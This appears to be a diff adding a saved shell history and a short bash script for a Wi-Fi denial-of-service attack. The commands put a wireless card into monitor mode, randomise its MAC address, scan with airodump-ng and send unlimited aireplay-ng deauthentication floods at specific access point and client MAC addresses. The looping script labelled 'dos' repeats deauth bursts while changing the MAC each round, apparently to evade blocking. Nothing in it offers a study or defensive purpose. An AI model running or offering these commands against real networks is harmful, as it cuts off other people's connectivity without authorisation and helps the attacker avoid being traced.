@@ -1,0 +1,40 @@
+    1  cd Desktop/
+    6  ifconfig 
+    7  ifconfig wlan0 down
+    8  macchanger -r wlan0
+    9  iwconfig wlan0 mode monitor
+   10  ifconfig wlan0 up
+   11  iwconfig
+   12  iwconfig wlan0
+   13  iwconfig wlan0 | grep Mode
+   14  clear
+   15  airmon-ng check wlan0
+   16  kill 1211
+   17  kill 1259
+   18  airmon-ng check wlan0
+   19  clear
+
+   64  airodump-ng wlan0
+   65  aireplay-ng -0 0 -a C8:3A:35:2A:BF:48 wlan0
+   66  iwconfig wlan0 channel 6
+   67  aireplay-ng -0 0 -a C8:3A:35:2A:BF:48 wlan0
+   69  aireplay-ng -0 0 -a C8:3A:35:2A:BF:48 -c 8C:FA:BA:A9:D1:18 wlan0
+   72  airodump-ng --bssid C8:3A:35:2A:BF:48 --channel 6 wlan0
+   74  history > dos.txt
+
+					bash script for dos->
+		#!/bin/bash
+		while true
+		do
+			aireplay-ng -0 5 -a 90:F6:52:C1:BB:18 wlan0
+			ifconfig wlan0 down
+			macchanger -r wlan0 | grep "New MAC"
+			iwconfig wlan0 mode monitor
+			ifconfig wlan0 up
+			iwconfig wlan0 | grep Mode
+			sleep 3
+			echo Waiting!!!!!!!
+		done
+
+	aireplay-ng -0 0 -a C8:3A:35:2A:BF:48 -c 8C:FA:BA:A9:D1:18 wlan0
+			
